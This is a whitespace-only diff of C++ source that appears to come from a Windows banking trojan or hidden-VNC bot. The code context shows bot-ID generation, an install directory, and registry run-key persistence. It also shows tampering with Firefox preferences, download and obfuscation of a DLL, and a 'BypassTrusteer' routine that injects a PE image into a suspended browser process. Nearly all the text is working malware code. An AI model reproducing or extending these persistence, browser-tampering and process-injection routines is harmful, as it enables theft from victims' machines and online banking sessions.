@@ -22,8 +22,8 @@ void GetBotId(char *botId)
 
    if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
       windowsDirectory[0] = L'C';
-   
-   volumeName[0] = windowsDirectory[0];   
+
+   volumeName[0] = windowsDirectory[0];
    volumeName[1] = ':';
    volumeName[2] = '\\';
    volumeName[3] = '\0';
@@ -32,7 +32,7 @@ void GetBotId(char *botId)
 
    GUID guid;
    guid.Data1 =          PseudoRand(&seed);
-   
+
    guid.Data2 = (USHORT) PseudoRand(&seed);
    guid.Data3 = (USHORT) PseudoRand(&seed);
    for(int i = 0; i < 8; i++)
@@ -83,7 +83,7 @@ void GetInstallPath(char *installPath)
    Funcs::pLstrcatA(installPath, Strs::fileDiv);
    Funcs::pLstrcatA(installPath, botId);
 
-   Funcs::pCreateDirectoryA(installPath, NULL); 
+   Funcs::pCreateDirectoryA(installPath, NULL);
 
    Funcs::pLstrcatA(installPath, Strs::fileDiv);
    Funcs::pLstrcatA(installPath, botId);
@@ -112,7 +112,7 @@ BOOL GetUserSidStr(PCHAR *sidStr)
       {
          if(Funcs::pLookupAccountNameA(NULL, userName, sid, &sidSize, refDomainName, &refDomainNameSize, &peUse))
          {
-            if(Funcs::pConvertSidToStringSidA(sid, sidStr)) 
+            if(Funcs::pConvertSidToStringSidA(sid, sidStr))
                success = TRUE;
          }
       }
@@ -136,16 +136,16 @@ HANDLE NtRegOpenKey(LPCTSTR subKey)
       uKey.Buffer        = Utf8toUtf16(key);
       uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
       uKey.MaximumLength = uKey.Length;
-     
+
       OBJECT_ATTRIBUTES objAttribs;
-      
+
       objAttribs.Length                     = sizeof(objAttribs);
       objAttribs.Attributes               = OBJ_CASE_INSENSITIVE;
       objAttribs.ObjectName               = &uKey;
       objAttribs.RootDirectory            = NULL;
       objAttribs.SecurityDescriptor         = NULL;
       objAttribs.SecurityQualityOfService = 0;
-      
+
       Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);
    }
    Funcs::pLocalFree(sid);
@@ -183,7 +183,7 @@ void SetStartupValue(char *path)
    NtRegSetValue(hKey, (BYTE *) regValueName, botIdSizeW + sizeof(wchar_t), REG_SZ, (BYTE *) pathW, pathWsize);
 
    Funcs::pFree(pathW);
-   Funcs::pCloseHandle(hKey);                             
+   Funcs::pCloseHandle(hKey);
 }
 
 BOOL VerifyPe(BYTE *pe, DWORD peSize)
@@ -204,7 +204,7 @@ BOOL IsProcessX64(HANDLE hProcess)
    Funcs::pIsWow64Process(hProcess, &wow64);
    if(wow64)
       return FALSE;
-    
+
    return TRUE;
 }
 
@@ -222,7 +222,7 @@ void *Alloc(size_t size)
 }
 
 void *ReAlloc(void *mem2realloc, size_t size)
-{   
+{
    void *mem = Funcs::pRealloc(mem2realloc, size);
    return mem;
 }
@@ -269,8 +269,8 @@ void SetFirefoxPrefs()
             for(;;)
             {
                if(Funcs::pStrncmp(entry, Strs::exp6, 7) == 0)
-               {  
-                  char randomDir[MAX_PATH]; 
+               {
+                  char randomDir[MAX_PATH];
                   if(Funcs::pGetPrivateProfileStringA(entry, Strs::exp7, 0, randomDir, MAX_PATH, ffDir) > 0)
                   {
                      int nPos = 0;
@@ -283,22 +283,22 @@ void SetFirefoxPrefs()
                         }
                      }
                      Funcs::pMemset(ffDir, 0, MAX_PATH);
-   
-                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData, 
+
+                     Funcs::pWsprintfA(ffDir, Strs::exp8, appData,
                           Strs::exp3,  Strs::exp4, Strs::exp5, randomDir, Strs::exp9);
-             
+
                      if(ffDir)
                      {
                         HANDLE ffPrefs = Funcs::pCreateFileA
                         (
-                           ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0, 
+                           ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
                         );
-                
+
                         if(ffPrefs != INVALID_HANDLE_VALUE)
                         {
                            DWORD fileSize = Funcs::pGetFileSize(ffPrefs, NULL);
-                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1); 
+                           char *fBuffer  = (CHAR *) Alloc(fileSize + 1);
                            DWORD bRead, bWritten;
                            if(Funcs::pReadFile(ffPrefs, fBuffer, fileSize, &bRead, NULL) == TRUE)
                            {
@@ -306,7 +306,7 @@ void SetFirefoxPrefs()
 
                               char botId[BOT_ID_LEN] = { 0 };
                               GetBotId(botId);
-                            
+
                               char botIdComment[BOT_ID_LEN + 10] = { 0 };
                               botIdComment[0] = '#';
                               Funcs::pLstrcatA(botIdComment, botId);
@@ -319,8 +319,8 @@ void SetFirefoxPrefs()
                               }
                               Funcs::pCloseHandle(ffPrefs);
                               return;
-                           }  
-                           Funcs::pFree(fBuffer);                 
+                           }
+                           Funcs::pFree(fBuffer);
                         }
                         Funcs::pCloseHandle(ffPrefs);
                         return;
@@ -329,7 +329,7 @@ void SetFirefoxPrefs()
                }
                entry += Funcs::pLstrlenA(entry) + 1;
                if(!entry[0])
-                  break; 
+                  break;
             }
          }
       }
@@ -382,8 +382,8 @@ void CopyDir(char *from, char *to)
 
       if
       (
-         findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
-         Funcs::pLstrcmpA(findData.cFileName, ".") && 
+         findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY &&
+         Funcs::pLstrcmpA(findData.cFileName, ".") &&
          Funcs::pLstrcmpA(findData.cFileName, "..")
       )
       {
@@ -399,12 +399,12 @@ static BYTE *ReadDll(char *path, char *botId)
 {
    HANDLE hFile = Funcs::pCreateFileA
    (
-      path, 
-      GENERIC_READ, 
-      0, 
-      NULL, 
-      OPEN_EXISTING, 
-      FILE_ATTRIBUTE_NORMAL, 
+      path,
+      GENERIC_READ,
+      0,
+      NULL,
+      OPEN_EXISTING,
+      FILE_ATTRIBUTE_NORMAL,
       NULL
    );
    if(hFile == INVALID_HANDLE_VALUE)
@@ -448,12 +448,12 @@ static void DownloadDll(char *path, BOOL x64, char *botId)
    Obfuscate(dll, dllSize, botId);
    HANDLE hFile = Funcs::pCreateFileA
    (
-      path, 
-      GENERIC_WRITE, 
-      0, 
-      NULL, 
-      CREATE_ALWAYS, 
-      FILE_ATTRIBUTE_NORMAL, 
+      path,
+      GENERIC_WRITE,
+      0,
+      NULL,
+      CREATE_ALWAYS,
+      FILE_ATTRIBUTE_NORMAL,
       NULL
    );
    DWORD written;
@@ -523,12 +523,12 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
 {
    HANDLE hBrowser = Funcs::pCreateFileA
    (
-      browserPath, 
-      GENERIC_READ, 
-      0, 
-      NULL, 
-      OPEN_EXISTING, 
-      FILE_ATTRIBUTE_NORMAL, 
+      browserPath,
+      GENERIC_READ,
+      0,
+      NULL,
+      OPEN_EXISTING,
+      FILE_ATTRIBUTE_NORMAL,
       NULL
    );
 
@@ -549,15 +549,15 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    {
       Funcs::pCreateProcessA
       (
-         browserPath, 
-         browserCommandLine, 
-         NULL, 
-         NULL, 
-         FALSE, 
-         CREATE_SUSPENDED, 
-         NULL, 
-         NULL, 
-         &startupInfo, 
+         browserPath,
+         browserCommandLine,
+         NULL,
+         NULL,
+         FALSE,
+         CREATE_SUSPENDED,
+         NULL,
+         NULL,
+         &startupInfo,
          &processInfo
       );
    }
@@ -577,10 +577,10 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
 
    PVOID remoteAddress = Funcs::pVirtualAllocEx
    (
-      processInfo.hProcess, 
-      LPVOID(ntHeaders->OptionalHeader.ImageBase), 
-      ntHeaders->OptionalHeader.SizeOfImage, 
-      0x3000, 
+      processInfo.hProcess,
+      LPVOID(ntHeaders->OptionalHeader.ImageBase),
+      ntHeaders->OptionalHeader.SizeOfImage,
+      0x3000,
       PAGE_EXECUTE_READWRITE
    );
    if(!Funcs::pWriteProcessMemory(processInfo.hProcess, remoteAddress, browser, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
@@ -589,10 +589,10 @@ DWORD BypassTrusteer(PROCESS_INFORMATION *processInfoParam, char *browserPath, c
    {
       if(!Funcs::pWriteProcessMemory
       (
-         processInfo.hProcess, 
-         LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress), 
-         browser + sectionHeader[i].PointerToRawData, 
-         sectionHeader[i].SizeOfRawData, 
+         processInfo.hProcess,
+         LPVOID(DWORD64(remoteAddress) + sectionHeader[i].VirtualAddress),
+         browser + sectionHeader[i].PointerToRawData,
+         sectionHeader[i].SizeOfRawData,
          NULL
       )) goto exit;
    }
